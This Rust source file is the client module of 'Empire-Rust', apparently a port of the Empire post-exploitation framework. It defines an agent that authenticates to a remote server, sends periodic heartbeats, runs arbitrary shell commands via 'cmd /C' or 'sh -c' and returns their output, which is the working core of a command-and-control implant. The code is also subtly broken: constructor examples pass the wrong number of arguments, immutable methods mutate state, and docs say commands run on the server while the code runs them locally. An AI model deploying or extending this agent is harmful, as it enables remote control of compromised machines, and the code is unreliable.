//! Client module for the Empire-Rust framework.
//!
//! This module implements the client-side functionality of the Empire framework.
//! It provides a concrete implementation of the `EmpireClient` trait, allowing
//! agents to connect to and communicate with an Empire server.

use crate::core::{EmpireClient, EmpireError, Message, MessageHandler, TaskStatus};
use std::net::SocketAddr;
use tokio::net::TcpStream;
use tokio_util::codec::{Framed, LengthDelimitedCodec};
use log::{error, info};
use std::process::Command;
use std::time::Duration;
use tokio::time;

/// Implementation of the Empire client.
///
/// The client maintains a connection to an Empire server and provides methods
/// for executing commands and receiving results.
///
/// # Examples
///
/// ```no_run
/// use empire_rust::client::Client;
///
/// #[tokio::main]
/// async fn main() {
///     let client = Client::new("127.0.0.1".to_string(), 1337)
///         .expect("Failed to create client");
///     client.connect().await.expect("Failed to connect to server");
/// }
/// ```
pub struct Client {
    /// Server address to connect to
    server_addr: SocketAddr,
    
    /// Active connection to the server, if any
    connection: Option<Framed<TcpStream, LengthDelimitedCodec>>,
    
    /// Agent ID assigned by the server
    agent_id: Option<String>,
    
    /// Username for authentication
    username: String,
    
    /// Password for authentication
    password: String,
}

impl Client {
    /// Creates a new instance of the Empire client.
    ///
    /// # Arguments
    ///
    /// * `host` - The hostname or IP address of the server
    /// * `port` - The port number of the server
    ///
    /// # Returns
    ///
    /// A new `Client` instance configured to connect to the specified server.
    ///
    /// # Errors
    ///
    /// Returns an `EmpireError` if:
    /// - The host string is invalid
    /// - The port number is invalid
    /// - The server address cannot be parsed
    ///
    /// # Examples
    ///
    /// ```no_run
    /// use empire_rust::client::Client;
    ///
    /// let client = Client::new("127.0.0.1".to_string(), 1337)
    ///     .expect("Failed to create client");
    /// ```
    pub fn new(host: String, port: u16, username: String, password: String) -> Result<Self, EmpireError> {
        let addr = format!("{}:{}", host, port)
            .parse()
            .map_err(|e| EmpireError::ConnectionError(e.to_string()))?;
        
        Ok(Self {
            server_addr: addr,
            connection: None,
            agent_id: None,
            username,
            password,
        })
    }

    /// Sends a heartbeat message to the server.
    async fn send_heartbeat(&mut self) -> Result<(), EmpireError> {
        if let Some(connection) = &mut self.connection {
            if let Some(agent_id) = &self.agent_id {
                connection.send_message(Message::Heartbeat {
                    agent_id: agent_id.clone(),
                }).await?;
            }
        }
        Ok(())
    }

    /// Starts the heartbeat loop.
    async fn start_heartbeat(&mut self) {
        let mut interval = time::interval(Duration::from_secs(30));
        loop {
            interval.tick().await;
            if let Err(e) = self.send_heartbeat().await {
                error!("Error sending heartbeat: {}", e);
                break;
            }
        }
    }

    /// Executes a command locally and returns the result.
    async fn execute_local_command(&self, command: &str) -> Result<(bool, String), EmpireError> {
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .args(["/C", command])
                .output()
                .map_err(|e| EmpireError::CommandError(e.to_string()))?
        } else {
            Command::new("sh")
                .arg("-c")
                .arg(command)
                .output()
                .map_err(|e| EmpireError::CommandError(e.to_string()))?
        };

        let success = output.status.success();
        let output_str = String::from_utf8_lossy(&output.stdout).to_string();
        let error_str = String::from_utf8_lossy(&output.stderr).to_string();

        let result = if !error_str.is_empty() {
            format!("{}\nError: {}", output_str, error_str)
        } else {
            output_str
        };

        Ok((success, result))
    }
}

#[async_trait::async_trait]
impl EmpireClient for Client {
    /// Connects to the Empire server.
    ///
    /// This method establishes a connection to the server specified during
    /// client creation. It must be called before any commands can be executed.
    ///
    /// # Errors
    ///
    /// Returns an `EmpireError` if:
    /// - The client is already connected
    /// - The connection to the server fails
    /// - Any other error occurs during connection
    async fn connect(&self) -> Result<(), EmpireError> {
        if self.connection.is_some() {
            return Err(EmpireError::ConnectionError("Already connected".to_string()));
        }

        let stream = TcpStream::connect(self.server_addr)
            .await
            .map_err(|e| EmpireError::ConnectionError(e.to_string()))?;

        let mut framed = Framed::new(stream, LengthDelimitedCodec::new());

        // Send authentication request
        framed.send_message(Message::AuthRequest {
            username: self.username.clone(),
            password: self.password.clone(),
        }).await?;

        // Wait for authentication response
        match framed.receive_message().await? {
            Message::AuthResponse { success, message, agent_id } => {
                if success {
                    if let Some(id) = agent_id {
                        self.agent_id = Some(id);
                        info!("Successfully connected to server");
                        Ok(())
                    } else {
                        Err(EmpireError::AuthenticationError("No agent ID received".to_string()))
                    }
                } else {
                    Err(EmpireError::AuthenticationError(message))
                }
            }
            _ => Err(EmpireError::AuthenticationError("Invalid response type".to_string())),
        }
    }

    /// Disconnects from the Empire server.
    ///
    /// This method gracefully closes the connection to the server and
    /// cleans up any associated resources.
    ///
    /// # Errors
    ///
    /// Returns an `EmpireError` if:
    /// - The client is not connected
    /// - The disconnection fails
    /// - Any other error occurs during disconnection
    async fn disconnect(&self) -> Result<(), EmpireError> {
        // TODO: Implement graceful disconnection
        Ok(())
    }

    /// Executes a command on the connected server.
    ///
    /// This method sends a command to the server and waits for the result.
    /// The command is executed on the server side, and the output is returned.
    ///
    /// # Arguments
    ///
    /// * `command` - The command to execute
    ///
    /// # Returns
    ///
    /// The output of the executed command.
    ///
    /// # Errors
    ///
    /// Returns an `EmpireError` if:
    /// - The client is not connected
    /// - The command execution fails
    /// - Any other error occurs during command execution
    async fn execute_command(&self, command: &str) -> Result<String, EmpireError> {
        if self.connection.is_none() {
            return Err(EmpireError::ConnectionError("Not connected".to_string()));
        }

        // Execute command locally
        let (success, output) = self.execute_local_command(command).await?;

        // Send result to server
        if let Some(connection) = &mut self.connection {
            connection.send_message(Message::CommandResult {
                id: uuid::Uuid::new_v4().to_string(),
                success,
                output,
                error: None,
            }).await?;
        }

        Ok("Command executed".to_string())
    }
} 